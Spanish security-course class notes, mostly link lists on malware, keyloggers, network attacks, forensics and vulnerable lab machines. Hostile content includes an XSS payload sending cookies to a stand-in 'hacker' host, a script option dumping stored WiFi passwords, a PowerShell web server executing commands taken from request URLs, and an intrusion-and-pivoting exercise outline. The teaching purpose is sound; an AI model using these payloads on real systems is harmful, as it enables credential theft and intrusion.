# Repaso de todo
* https://github.com/jesusninoc/ClasesSAD/blob/master/2020-12-04.md#detectar-xss
* XSS -> "><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>

--------------------
--------------------

# Implantación de mecanismos de seguridad activa
- Ataques y contramedidas en sistemas personales:
  - Seguridad en sistemas de ficheros. Acceso a recursos. Listas de control de acceso.
    * https://www.jesusninoc.com/06/09/crear-un-recurso-compartido-y-asignar-permisos-al-recurso/
    * https://www.jesusninoc.com/08/19/anadir-permiso-ntfs-a-una-carpeta/
    * https://www.jesusninoc.com/02/21/permisos-en-linux/
    * https://www.jesusninoc.com/01/19/programacion-de-permisos/
  - Actualización de sistemas y aplicaciones. Autenticidad de aplicaciones y actualizaciones.
    * https://www.jesusninoc.com/07/05/5-gestion-del-software-en-powershell/#Actualizaciones
  - Anatomía de ataques y análisis de software malicioso (malware: virus, gusanos, spyware, keylogers…).
    * https://www.jesusninoc.com/01/23/cifrar-con-un-algoritmo-sencillo-el-nombre-y-el-contenido-de-un-fichero-de-texto/
    * https://www.jesusninoc.com/03/11/keylogger-sencillo-con-powershell/
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2019-01-28.md
    * https://github.com/jesusninoc/Seguridad/blob/master/Una%20aproximaci%C3%B3n%20a%20los%20virus%20en%20PowerShell.md
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-02-19.md#antivirus
    * https://www.jesusninoc.com/07/16/transfer-keylogger-log-file-between-server-and-client-sockets-tcp/
    * http://powershell.com/cs/blogs/tips/archive/2015/12/09/creating-simple-keylogger.aspx
    * https://github.com/vacmf/powershell-scripts/blob/master/powershell-keylogger.ps1
    * https://www.jesusninoc.com/04/30/enviar-datos-a-un-formulario-de-google-docs-desde-powershell-deducir-los-parametros-que-se-envian-por-post/
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-02-08.md

--------------

# Antivirus realizado por Miguel (MikeRuSe)
* https://github.com/MikeRuSe/Scripts/tree/master/Antivirus_Proyect

## Código del antivirus
```PowerShell
## Buscar el hash de un archivo en VirusTotal
## Testeado y desarrollado en Windows 8.1 Pro y en Windows 10 Pro
## Registrar la API Key: https://www.virustotal.com/gui/join-us
## Es recomendable cambiar la API de abajo
    $VT_API = "45eb6546356546346454dgfhdfhdfghdgfh977"
## Establecemos el protocolo TLS 1.2
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Function submit-VTHash($VThash)
{
    $VTcuerpo = @{resource = $VThash; apikey = $VT_API}
    $VTresultado = Invoke-RestMethod -Method GET -Uri 'https://www.virustotal.com/vtapi/v2/file/report' -Body $VTcuerpo

    return $vtResultado
}

## Menú personalizado
$Titulo = 'ANTIVIRUS v1.0.4 by www.github.com/MikeRuSe'
Clear-Host
    Write-Host "                " -NoNewline; Write-Host "====================== $Titulo ======================" -ForegroundColor Gray
    Write-Host " "
    Write-Host "                                                    " -NoNewline;Write-Host "¿Qué desea analizar?" -ForegroundColor Green
    Write-Host " "
    Write-Host "                 " -NoNewline; Write-Host " Presione '1' para analizar un hash" -ForegroundColor Magenta
    Write-Host "                 " -NoNewline;Write-Host " Presione '2' para analizar un archivo" -ForegroundColor Magenta
    Write-Host "                 " -NoNewline;Write-Host " Presione '3' para analizar una carpeta y sus archivos (pueden no aparecer todos los datos de los archivos...)" -ForegroundColor Magenta
    Write-Host "                 " -NoNewline;Write-Host " Presione '4' para recuperar contraseñas WiFi" -ForegroundColor Magenta
    Write-Host "                 " -NoNewline;Write-Host " Presione otra tecla para salir" -ForegroundColor Red
    Write-Host " "
# Comienzo del script:
    Start-Sleep -Milliseconds 200
$opcion= Read-Host "Introduzca un valor"
If ($opcion -eq "1"){
        ## Escriba el hash
        Write-Host "Introduzca el código hash" -ForegroundColor Yellow
        $hash= Read-Host "Introduzca un valor"
           #Para probar el script podemos usar el siguiente hash: "ba4038fd20e474c047be8aad5bfacdb1bfc1ddbe12f803f473b7918d8d819436"
    ## Introducimos el hash en la función
    $VTresultado = submit-VTHash($hash)
    ## RESULTADOS
        Write-Host -ForegroundColor Cyan "Resource    : " -NoNewline; Write-Host $VTresultado.resource
        Write-Host -ForegroundColor Cyan "Scan date   : " -NoNewline; Write-Host $VTresultado.scan_date
        Write-Host -ForegroundColor Cyan "Positives   : " -NoNewline; Write-Host $VTresultado.positives
        Write-Host -ForegroundColor Cyan "Total Scans : " -NoNewline; Write-Host $VTresultado.total
        Write-Host -ForegroundColor Cyan "Permalink   : " -NoNewline; Write-Host $VTresultado.permalink
    }
    Else{
If ($opcion -eq "2"){
        ## Archivo
        Write-Host "Introduzca la ubicación de la carpeta del archivo (C:\Users\Administrador) sin la barra del final" -ForegroundColor Yellow
        $ubicacion= Read-Host "Introduzca la ruta del archivo"
         Write-Host "Introduzca del archivo (Archivo.txt)" -ForegroundColor Yellow
         $ruta= Read-Host "Introduzca el nombre del archivo"
            $archivo= "$ubicacion\$ruta"
            $hash= Get-FileHash -LiteralPath $archivo -Algorithm SHA256
            $hash= ($hash.Hash).ToLower()
    ## Introducimos el hash en la función
    $VTresultado = submit-VTHash($hash)
    ## RESULTADOS
        Write-Host -ForegroundColor Cyan "Fuente                : " -NoNewline; Write-Host $VTresultado.resource
        Write-Host -ForegroundColor Cyan "Fecha del análisis    : " -NoNewline; Write-Host $VTresultado.scan_date
        Write-Host -ForegroundColor Cyan "Errores encontrados   : " -NoNewline; Write-Host $VTresultado.positives
        Write-Host -ForegroundColor Cyan "Análisis totales      : " -NoNewline; Write-Host $VTresultado.total
        Write-Host -ForegroundColor Cyan "Link del análisis     : " -NoNewline; Write-Host $VTresultado.permalink
        $virus= $VTresultado.positives
        if ($virus -gt 0){
            Write-Host -ForegroundColor Red "Se han detectado amenazas"
            Write-Host -ForegroundColor DarkRed "Ubicación de la amenaza  : " -NoNewline; Write-Host -ForegroundColor Gray "$archivo "
            }
        else{
            Write-Host -ForegroundColor Green "No hay riesgos"
            }
        }
        Else{

If ($opcion -eq "3"){
        ## Análisis de directorios y sus archivos
        $dir= Read-Host "Introduzca la dirección del directorio a analizar"
        ## Obtenemos todos los archivos de la carpeta seleccionada con la función -Recurse y con -FullName obtenemos la ruta exacta de cada archivo de la carpeta
        foreach($directorio in (Get-ChildItem -File -Force $dir -Recurse).FullName){
            ## Se obtiene el hash del archivo que se va a analizar. Si es un directorio saldrá un error del tipo NULL en la shell
            $hash= Get-FileHash -LiteralPath $directorio -Algorithm SHA256
            ## Convertimos el hash a minúsculas
            $hash= ($hash.Hash).ToLower()
            ## Introducimos el hash en la función
            $VTresultado = submit-VTHash($hash)
            ## Extracción de resultados
            Write-Host -ForegroundColor Cyan "Fuente                : " -NoNewline; Write-Host $VTresultado.resource
            Write-Host -ForegroundColor Cyan "Fecha del analáisis   : " -NoNewline; Write-Host $VTresultado.scan_date
            Write-Host -ForegroundColor Cyan "Errores encontrados   : " -NoNewline; Write-Host $VTresultado.positives
            Write-Host -ForegroundColor Cyan "Análisis totales      : " -NoNewline; Write-Host $VTresultado.total
            Write-Host -ForegroundColor Cyan "Link del análisis     : " -NoNewline; Write-Host $VTresultado.permalink
            ## Extraemos en la shell si hay virus o no, si hay virus, saldrá un texto en rojo mencionando que hay amenazas y nos proporcionará la ubicación del archivo infectado
            $virus= $VTresultado.positives
            if ($virus -gt 0){
                Write-Host -ForegroundColor Red "Se han detectado amenazas"
                Write-Host -ForegroundColor DarkRed "Ubicación de la amenaza: " -NoNewline; Write-Host -ForegroundColor Gray "$directorio"
                }
            else{
                Write-Host -ForegroundColor Green "No hay riesgos"
               }
          }
     }
     Else{
If ($opcion -eq "4"){
    ## Script para recuperar contraseñas de WiFi en el ordenador
     ## Obtenemos la información de las SSID a las que se ha conectado nuestro PC
     $WifiSSIDs = (netsh wlan show profiles | Select-String ': ' ) -replace ".*:\s+"
      ## Extraemos la contraseña almacenada en el PC mediante la funcion de key=clear | Select-String 'Key Content'
      $WifiInfo = foreach($SSID in $WifiSSIDs) {
        ## Si el PC no está en inglés debemos sustituir el 'Contenido de la clave' por 'Key Content'
        $Contraseña = (netsh wlan show profiles name=$SSID key=clear | Select-String 'Contenido de la clave') -replace ".*:\s+"
        New-Object -TypeName psobject -Property @{"Contraseña"=$Contraseña;"SSID"=$SSID}
            }
            ## La opción "ConvertTo-Json" es opcional, podríamos poner un "ConvertTo-Html" para luego subirlo a una web, como no es el caso lo dejamos en "ConvertTo-Json"
      $WifiInfo | ConvertTo-Json
      }
Else{
        ## Cualquier otro carácter introducido que no pertenezca a los declarados más arriba hará que se cancele la ejecución del script
        Write-Host "No se analizará nada" -ForegroundColor Red
   }
  }
 }
}

### OMITIR LO SIGUIENTE, AÚN SE ENCUENTRA EN DESAROLLO
"
## Para crear Logs:
        ## Crear archivo de LOGS:
        cd C:\DESCARGAS\Logs
        $dia= (date).DayOfYear
        $hora= (date).Hour
        $minuto= (date).Minute
            mkdir $dia -Force
            cd $dia
            'LOGS' > $hora~$minuto.txt
                Write-Host ' '
                Write-Host 'Análisis de directorios y sus archivos' -ForegroundColor Cyan
        ## Al final de cada codigo añadimos: >> $hora~$minuto.txt
        "
```

--------------------
--------------------

# Implantación de mecanismos de seguridad activa
- Ataques y contramedidas en sistemas personales:
  - Seguridad en la conexión con redes públicas.
    * https://www.hackerarsenal.com/collections/frontpage/products/wimonitor
    * https://shop.hak5.org/collections/all
    * http://www.keelog.com/es/
    * http://rubyfu.net/content/module_0x3__network_kung_fu/ssid_finder.html
    * https://www.jesusninoc.com/10/16/enviar-paquetes-de-desasociacion-con-aireplay-ng-a-un-cliente-que-actualmente-esta-asociado-con-un-punto-de-acceso-en-linux-realizando-una-conexion-ssh-desde-powershell-en-windows/
    * https://shop.hak5.org/products/usb-rubber-ducky-deluxe
    * https://www.jesusninoc.com/03/09/scripts-en-rubber-ducky-parte-1/
    * https://www.jesusninoc.com/03/20/scripts-en-rubber-ducky-parte-2/
    * https://www.jesusninoc.com/ducky-scripts/
  - Pautas y prácticas seguras.
    * https://www.jesusninoc.com/01/01/extraer-coordenadas-gps-de-imagenes-con-powershell/
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-01-24.md#reconocimiento-recolectar-informaci%C3%B3n
    * https://noticiasseguridad.com/tutoriales/the-harvester-busque-a-los-empleados-que-trabajan-en-una-empresa/
    * https://www.jesusninoc.com/05/27/crear-codigo-qr-para-una-ubicacion-gps/
    * https://www.jesusninoc.com/05/23/crear-codigo-qr-para-la-conexion-wifi/
    * https://www.jesusninoc.com/06/01/crear-y-leer-un-codigo-qr-con-un-comando-en-bash-mediante-wsl-desde-powershell/
    * https://www.jesusninoc.com/06/05/crear-un-servidor-web-con-un-servicio-que-permita-leer-un-codigo-qr-desde-powershell/
    * https://social.technet.microsoft.com/Forums/windowsserver/en-US/4425e609-1353-4b03-b9d9-ed4a3bc5e365/running-an-excel-macro-from-powershell?forum=winserverpowershell
    * https://www.blackhillsinfosec.com/phishing-with-powerpoint/
    * https://community.idera.com/database-tools/powershell/powertips/b/tips/posts/invoking-excel-macros-from-powershell

--------------------

# Ataque (seguridad en la red corporativa)
## Acercarse al objetivo, ataque paso a paso y fallos posibles
* https://github.com/jesusninoc/ClasesISO/blob/master/2018-03-01.md

# Ejercicio
## Obtener información del Whois de varios dominios e importarlo en PowerShell en formato XML y enviarlo por mail
### Whois
  - Whois https://docs.microsoft.com/en-us/sysinternals/downloads/whois
  - Whois XML https://hexillion.com/samples/WhoisXML/?query=jesusninoc.com
  - Whois JSON https://hexillion.com/samples/WhoisXML/?query=jesusninoc.com&_accept=application%2Fvnd.hexillion.whois-v2%2Bjson
### Importar contenido XML en PowerShell
* https://www.jesusninoc.com/02/10/importar-un-contenido-xml-en-powershell/
### Enviar un mail desde PowerShell
* https://www.jesusninoc.com/04/11/enviar-un-mail-desde-powershell/

--------------------
--------------------

# Implantación de mecanismos de seguridad activa
- Seguridad en la red corporativa:
  - Problemas de seguridad y vulnerabilidades en protocolos TCP/IP.
    * https://www.jesusninoc.com/07/09/9-gestion-de-la-red-en-powershell/
    * https://0xword.com/es/libros/26-libro-ataques-redes-datos-ipv4-ipv6.html
    * https://github.com/JorgeDuenasLerin/seguridad-informatica-smr2dual/blob/gh-pages/apuntes/7/SI-T-07-Redes%20Seguras.docx
    * https://www.jesusninoc.com/03/20/mostrar-informacion-avanzada-de-los-procesos-que-se-estan-ejecutando-en-relacion-con-los-servicios-y-los-puertos-abiertos-udp/

--------------------

# Ataque (seguridad en la red corporativa)
## Acercarse al objetivo, ataque paso a paso y fallos posibles
* https://github.com/jesusninoc/ClasesISO/blob/master/2018-03-01.md

# Ejercicio

- Analizar Whois (whois)
  - Whois https://docs.microsoft.com/en-us/sysinternals/downloads/whois
  - Whois XML https://hexillion.com/samples/WhoisXML/?query=jesusninoc.com
  - Whois JSON https://hexillion.com/samples/WhoisXML/?query=jesusninoc.com&_accept=application%2Fvnd.hexillion.whois-v2%2Bjson
- Equivalencias entre comandos de red de Windows y Cmdlets https://www.jesusninoc.com/02/04/equivalencias-entre-comandos-de-red-de-windows-y-cmdlets-de-powershell/
- Conocer la IP por resolución DNS (nslookup) https://blog.hostalia.com/white-papers/nslookup-herramienta-gestion-servidores-dns-whitepaper/
```
set type=A, para buscar registros A.
set type=PTR, para buscar registros reversos.
set type=MX, para buscar los registros Mail Exchange del correo.
set type=TXT, para buscar registros de texto como SPF o DKIM.
set type=CNAME, para buscar alias del dominio.
```
- Conocer la IP por resolución DNS sobre CloudUnflare https://github.com/greycatz/CloudUnflare
- Historial de cambios DNS https://completedns.com/
- Pedir todos los registros DNS que pueda (set type=any)
- Recorrer el rango de IP
  - Recorrer direcciones IP https://www.jesusninoc.com/2017/07/06/recorrer-direcciones-ip/
```PowerShell
foreach($primer in 1..254)
{
    start chrome ("80.80.80."+$primer)
    Start-Sleep -Seconds 5
}
```
- Concretar el objetivo contra una IP

--------------------
--------------------

# Implantación de mecanismos de seguridad activa
- Seguridad en la red corporativa:
  - Problemas de seguridad y vulnerabilidades en protocolos TCP/IP.

--------------------

# Problema de seguridad UDP
## Modificar datagrama UDP
* https://www.jesusninoc.com/12/29/server-and-client/
* https://www.jesusninoc.com/03/19/modificar-datagramas-udp-con-softperfect-network-protocol-analyzer/
### Cliente
```PowerShell
$port=2020
$endpoint = new-object System.Net.IPEndPoint ([IPAddress]"10.20.104.100",$port)
$udpclient=new-Object System.Net.Sockets.UdpClient
$b=[Text.Encoding]::ASCII.GetBytes('Hadadsfsdfsfdasfi')
$bytesSent=$udpclient.Send($b,$b.length,$endpoint)
$udpclient.Close()
```
### Servidor
```PowerShell
$port=2020
$endpoint = new-object System.Net.IPEndPoint ([IPAddress]::any,$port)
$udpclient=new-Object System.Net.Sockets.UdpClient $port
$content=$udpclient.Receive([ref]$endpoint)
[Text.Encoding]::ASCII.GetString($content)
$udpclient.Dispose()
```

--------------------

# Repaso
## XSS
* https://github.com/jesusninoc/ClasesSAD/blob/master/2019-11-04.md#simular-un-ataque-xss
## Fuerza bruta
* https://github.com/jesusninoc/ClasesIAW/blob/master/2019-11-13.md#fuerza-bruta

--------------------
--------------------

# Implantación de mecanismos de seguridad activa
- Ataques y contramedidas en sistemas personales
- Seguridad en la red corporativa
- Herramientas de seguridad y monitorización

--------------------

# Análisis forense
## Registry Ripper
* https://github.com/keydet89/RegRipper2.8
## f3e (Firefox 3 Extractor)
## Data Carving 
* https://www.computerhope.com/jargon/d/data-carving.htm
* https://www.jesusninoc.com/02/03/leer-el-contenido-de-un-fichero-y-representarlo-en-hexadecimal/
* https://www.jesusninoc.com/04/22/leer-el-contenido-de-un-fichero-bmp-en-ascii-y-representarlo-en-hexadecimal/
* https://www.jesusninoc.com/06/15/leer-el-contenido-de-un-fichero-que-contiene-bits/
## Thumbnail Database Viewer
* http://www.itsamples.com/thumbnail-database-viewer.html

--------------------
--------------------

# Implantación de mecanismos de seguridad activa
- Seguridad en la red corporativa:
  - Riesgos potenciales de los servicios de red.
    * https://www.jesusninoc.com/11/10/analizar-servicios-con-powershell/
  - Ataques en redes TCP/IP (suplantación, denegación de servicio…).
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-11-26.md
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-11-27.md
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-11-28.md
  - Seguridad en los accesos de red. Arranque de servicios. Puertos.
    * https://www.jesusninoc.com/04/13/relacion-entre-ip-puertos-y-procesos-con-powershell/
    * https://www.jesusninoc.com/12/29/relacion-entre-puertos-tcp-procesos-y-lista-de-puertos-de-la-iana/
    * https://www.jesusninoc.com/12/28/relacion-entre-puertos-udp-procesos-y-lista-de-puertos-de-la-iana-junto-con-una-breve-descripcion-de-cada-puerto/
    * https://www.jesusninoc.com/03/19/mostrar-informacion-avanzada-de-los-procesos-que-se-estan-ejecutando-en-relacion-con-los-servicios-y-los-puertos-abiertos-tcp/

--------------------

# Massive Hack Strikes Offshore Cayman National Bank and Trust
* https://www.elconfidencial.com/tecnologia/2019-11-19/hack-banco-islas-caiman-cuentas-filtradas_2342778/
* https://unicornriot.ninja/2019/massive-hack-strikes-offshore-cayman-national-bank-and-trust
* https://unicornriot.ninja/2019/massive-hack-strikes-offshore-cayman-national-bank-and-trust/#4.1
* https://empresas.blogthinkbig.com/shellshock-como-se-podria-explotar-en/

--------------------

# Ataque (seguridad en la red corporativa)
## Acercarse al objetivo, ataque paso a paso y fallos posibles
* https://github.com/jesusninoc/ClasesISO/blob/master/2018-03-01.md

--------------------

# Ejercicio

- Obtener datos https://docs.google.com/forms/d/e/1FAIpQLSd7iu5zDmkWuGDVZ5vd3hHgmSZLc2aZpOdTw83CMoJTN78rMA/viewform
- Analizar información con Zoomeye https://www.zoomeye.org/
- Analizar puertos (nmap) https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-11-28.md
- Buscar vulnerabilidades https://www.exploit-db.com/
- Una vez tomado el control
- Netcat o a nuestro modo
- Colocar un FTP cuanto antes (no vale \\localhost\c$)
- REALIZAR ATAQUE DESDE UN ORDENADOR INTERMEDIO
- Tomar control con Kaht2
- Conectarse entre ordenadores de los que se ha tomado el control

## Ayuda (formulario de Google)
### ENVIAR DATOS A UN FORMULARIO DE GOOGLE DOCS DESDE POWERSHELL
* https://www.jesusninoc.com/03/11/enviar-datos-a-un-formulario-de-google-docs-desde-powershell/
### ENVIAR DATOS A UN FORMULARIO DE GOOGLE DOCS DESDE POWERSHELL (DEDUCIR LOS PARÁMETROS QUE SE ENVÍAN POR POST)
* https://www.jesusninoc.com/04/30/enviar-datos-a-un-formulario-de-google-docs-desde-powershell-deducir-los-parametros-que-se-envian-por-post/
### ACCEDER A LOS DATOS PUBLICADOS EN UN FORMULARIO DE GOOGLE DESDE POWERSHELL
* https://www.jesusninoc.com/05/01/acceder-a-los-datos-publicados-en-un-formulario-de-google-desde-powershell/

--------------------

# Máquina virtual vulnerable
* https://metasploit.help.rapid7.com/docs/metasploitable-2-exploitability-guide
* https://www.fwhibbit.es/guia-metasploitable-2-parte-1
* https://www.fwhibbit.es/guia-metasploitable-2-parte-2
* https://www.fwhibbit.es/guia-metasploitable-2-parte-3
* https://www.redinskala.com/2013/05/14/comandos-metasploit/
* https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor
```bash
nmap -sV -sC -sS -p
```

# Otras máquinas
* https://github.com/jesusninoc/Seguridad/blob/master/M%C3%A1quinas%20vulnerables.md
* https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-03-07.md
* https://www.vulnhub.com/entry/gameover-1,16/
* https://www.kitploit.com/2018/05/owasp-juice-shop-intentionally-insecure.html?utm_source=feedburner&utm_medium=feed&utm_campaign=Feed%3A+PentestTools+%28PenTest+Tools%29
* https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/appendix/solutions.html

--------------------

# For use with Kali Linux. Custom bash scripts used to automate various pentesting tasks.
https://github.com/leebaird/discover

Follow on Twitter [![Twitter Follow](https://img.shields.io/twitter/follow/discoverscripts.svg?style=social&label=Follow)](https://twitter.com/discoverscripts) [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://github.com/leebaird/discover/blob/master/LICENSE)


For use with Kali Linux. Custom bash scripts used to automate various pentesting tasks.

### Download, setup & usage
* git clone https://github.com/leebaird/discover /opt/discover/
* All scripts must be ran from this location.
* cd /opt/discover/
* ./update.sh

```
RECON
1.  Domain
2.  Person
3.  Parse salesforce

SCANNING
4.  Generate target list
5.  CIDR
6.  List
7.  IP, range, or domain
8.  Rerun Nmap scripts and MSF aux

WEB
9.  Insecure direct object reference
10. Open multiple tabs in Firefox
11. Nikto
12. SSL

MISC
13. Crack WiFi
14. Parse XML
15. Generate a malicious payload
16. Start a Metasploit listener
17. Update
18. Exit
```

--------------------
--------------------

# Clase de hoy
* https://jesusninoc.github.io/ClasesSAD/2019-11-22.html

--------------------

# Implantación de mecanismos de seguridad activa
- Seguridad en la red corporativa:
  - Riesgos potenciales de los servicios de red.
    * https://www.jesusninoc.com/11/10/analizar-servicios-con-powershell/
  - Ataques en redes TCP/IP (suplantación, denegación de servicio…).
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-11-26.md
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-11-27.md
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-11-28.md
  - Seguridad en los accesos de red. Arranque de servicios. Puertos.
    * https://www.jesusninoc.com/04/13/relacion-entre-ip-puertos-y-procesos-con-powershell/
    * https://www.jesusninoc.com/12/29/relacion-entre-puertos-tcp-procesos-y-lista-de-puertos-de-la-iana/
    * https://www.jesusninoc.com/12/28/relacion-entre-puertos-udp-procesos-y-lista-de-puertos-de-la-iana-junto-con-una-breve-descripcion-de-cada-puerto/
    * https://www.jesusninoc.com/03/19/mostrar-informacion-avanzada-de-los-procesos-que-se-estan-ejecutando-en-relacion-con-los-servicios-y-los-puertos-abiertos-tcp/
 
--------------------

# Cliente-Servidor

## Comunicación entre cliente y servidor
* https://www.jesusninoc.com/2015/02/25/creating-reverse-shell/
* https://www.jesusninoc.com/2015/02/26/creating-shell/
* https://www.jesusninoc.com/2017/10/18/crear-una-comunicacion-entre-un-cliente-en-bash-de-linux-y-un-servidor-en-powershell-de-windows-utilizando-tcpip/
* https://www.jesusninoc.com/2017/10/26/crear-una-comunicacion-entre-un-cliente-en-powershell-de-windows-y-un-servidor-en-bash-de-linux-utilizando-tcpip/
* https://www.jesusninoc.com/06/02/crear-una-comunicacion-entre-un-cliente-en-powershell-de-windows-y-un-servidor-en-node-js-utilizando-tcp-ip/
* https://www.jesusninoc.com/2016/04/30/simular-el-funcionamiento-de-un-servidor-web-utilizando-netcat-en-linux/
* https://www.jesusninoc.com/2009/06/06/ejecutar-nc-exe-cmd-exe-remotamente/
* https://www.jesusninoc.com/11/10/realizar-conexiones-tcp-udp-con-powershell/
* https://www.jesusninoc.com/2013/01/02/server-and-client-sockets-tcp/

## Utilizando la comunicación remota entre cliente y servidor simular una conexión a una shell y una reverse shell
* https://www.jesusninoc.com/01/27/ejecutar-un-cmdlet-remotamente-en-un-equipo-utilizando-sockets-udp/
* https://www.jesusninoc.com/2015/02/25/creating-reverse-shell/
* https://www.jesusninoc.com/2015/02/26/creating-shell/

## Servidor desde PowerShell
* https://www.jesusninoc.com/2017/05/06/crear-un-servidor-web-al-que-se-pueda-acceder-desde-cualquier-parte-de-la-red-privada-con-powershell/

## Ejecutar un comando remotamente utilizando un servidor web creado en PowerShell
```Powershell
$routes = @{
    "/" = { return '<html><body>Servidor web funcionando</body></html>' }
}

#Importante poner la IP de la red privada
$url = 'http://192.168.204.222:8027/'
$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add($url)
$listener.Start()

Write-Host "Funcionando $url..."

while ($listener.IsListening)
{
    $context = $listener.GetContext()
    $requestUrl = $context.Request.Url
    $response = $context.Response

    Write-Host ''
    Write-Host "Petición: $requestUrl"

    $localPath = $requestUrl.LocalPath
    $route = $routes.Get_Item($requestUrl.LocalPath)

    if ($route -eq $null)
    {
        $response.StatusCode = 404
    }
    else
    {
        
        $content = & $route
        $buffer = [System.Text.Encoding]::UTF8.GetBytes($content)
        $response.ContentLength64 = $buffer.Length
        $response.OutputStream.Write($buffer, 0, $buffer.Length)
    }
    
    $response.Close()
    start-process ($context.Request.RawUrl -replace "/")
    $context.Request.RawUrl
    $responseStatus = $response.StatusCode
    Write-Host "Respuesta: $responseStatus"
}
```

## JVM Post-Exploitation One-Liners (Reverse Shell)
* https://gist.github.com/frohoff/a976928e3c1dc7c359f8

------------------

# Packet Sender
Packet Sender can send and receive UDP, TCP, and SSL on the ports of your choosing. 
All servers and clients may run simultaneously. https://packetsender.com/download

------------------

# SoftPerfect Network Protocol Analyzer

## Modificar datagramas UDP con SoftPerfect Network Protocol Analyzer
https://www.jesusninoc.com/2016/03/19/modificar-datagramas-udp-con-softperfect-network-protocol-analyzer/

## Modificar la dirección IP de origen en mensajes UDP con SoftPerfect Network Protocol Analyzer
https://www.jesusninoc.com/2016/04/02/modificar-la-direccion-ip-de-origen-en-mensajes-udp-con-softperfect-network-protocol-analyzer/

--------------------
--------------------


--------------------
--------------------

# Implantación de mecanismos de seguridad activa
- Seguridad en la red corporativa:
  - Riesgos potenciales de los servicios de red.
    * https://www.jesusninoc.com/11/10/analizar-servicios-con-powershell/
  - Ataques en redes TCP/IP (suplantación, denegación de servicio…).
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-11-26.md
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-11-27.md
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-11-28.md
  - Seguridad en los accesos de red. Arranque de servicios. Puertos.
    * https://www.jesusninoc.com/04/13/relacion-entre-ip-puertos-y-procesos-con-powershell/
    * https://www.jesusninoc.com/12/29/relacion-entre-puertos-tcp-procesos-y-lista-de-puertos-de-la-iana/
    * https://www.jesusninoc.com/12/28/relacion-entre-puertos-udp-procesos-y-lista-de-puertos-de-la-iana-junto-con-una-breve-descripcion-de-cada-puerto/
    * https://www.jesusninoc.com/03/19/mostrar-informacion-avanzada-de-los-procesos-que-se-estan-ejecutando-en-relacion-con-los-servicios-y-los-puertos-abiertos-tcp/
  - Descripción general de protocolos seguros a diferentes niveles: IPsec (Internet Protocol Security), SSL/TSL (Secure Sockets Layer/Transport Layer Security), PGP (Pretty Good Privacy), S/MIME (Secure / Multipurpose Internet Mail Extensions)...
    - IPsec: capa 3. VPN.
    - SSL/TSL: capa 4.
    - PGP.
        * https://www.incibe-cert.es/sites/default/files/contenidos/guias/doc/incibe_cert_guia_para_el_uso_de_pgp_en_clientes_de_correo_electronico.pdf
    - S/MIME.
  - Seguridad en los protocolos para comunicaciones inalámbricas.
  - Monitorización del tráfico en redes.
    * https://www.jesusninoc.com/network/
    * https://www.jesusninoc.com/wireshark/
    * https://www.jesusninoc.com/07/09/9-gestion-de-la-red-en-powershell/
  - Intentos de penetración. Intrusiones externas vs. Intrusiones internas. Seguridad perimetral.

-------------------

# Bifrost (Trojan horse)

The server builder component has the following capabilities:

- Create the server component
- Change the server component's port number and/or IP address
- Change the server component's executable name
- Change the name of the Windows registry startup entry
- Include rootkit to hide server processes
- Include extensions to add features (adds 22,759 bytes to server)
- Use persistence (makes the server harder to remove from the infected system)

The client component has the following capabilities:

- Process Manager (Browse or kill running processes)
- File manager (Browse, upload, download, or delete files)
- Window Manager (Browse, close, maximize/minimize, or rename windows)
- Get system information
- Extract passwords from machine
- Keystroke logging
- Screen capture
- Webcam capture
- Desktop logoff, reboot or shutdown
- Registry editor
- Remote shell

--------------------
--------------------

# Implantación de mecanismos de seguridad activa
- Seguridad en la red corporativa:
  - Riesgos potenciales de los servicios de red.
    * https://www.jesusninoc.com/11/10/analizar-servicios-con-powershell/
  - Ataques en redes TCP/IP (suplantación, denegación de servicio…).
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-11-26.md
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-11-27.md
    * https://github.com/jesusninoc/ClasesSeguridad/blob/master/2018-11-28.md
  - Seguridad en los accesos de red. Arranque de servicios. Puertos.
    * https://www.jesusninoc.com/04/13/relacion-entre-ip-puertos-y-procesos-con-powershell/
    * https://www.jesusninoc.com/12/29/relacion-entre-puertos-tcp-procesos-y-lista-de-puertos-de-la-iana/
    * https://www.jesusninoc.com/12/28/relacion-entre-puertos-udp-procesos-y-lista-de-puertos-de-la-iana-junto-con-una-breve-descripcion-de-cada-puerto/
    * https://www.jesusninoc.com/03/19/mostrar-informacion-avanzada-de-los-procesos-que-se-estan-ejecutando-en-relacion-con-los-servicios-y-los-puertos-abiertos-tcp/
   - Descripción general de protocolos seguros a diferentes niveles: IPsec (Internet Protocol Security), SSL/TSL (Secure Sockets Layer/Transport Layer Security), PGP (Pretty Good Privacy), S/MIME (Secure / Multipurpose Internet Mail Extensions)...
      - IPsec: capa 3. VPN.
      - SSL/TSL: capa 4.
      - PGP.
          * https://www.incibe-cert.es/sites/default/files/contenidos/guias/doc/incibe_cert_guia_para_el_uso_de_pgp_en_clientes_de_correo_electronico.pdf
      - S/MIME.
----------------------

# Acabar práctica Bifrost
* https://github.com/jesusninoc/ClasesSAD/blob/master/2019-11-25.md#bifrost-trojan-horse

--------------------
--------------------

# Implantación de mecanismos de seguridad activa
- Seguridad en la red corporativa:
  - Descripción general de protocolos seguros a diferentes niveles: IPsec (Internet Protocol Security), SSL/TSL (Secure Sockets Layer/Transport Layer Security), PGP (Pretty Good Privacy), S/MIME (Secure / Multipurpose Internet Mail Extensions)...
     - IPsec: capa 3. VPN.
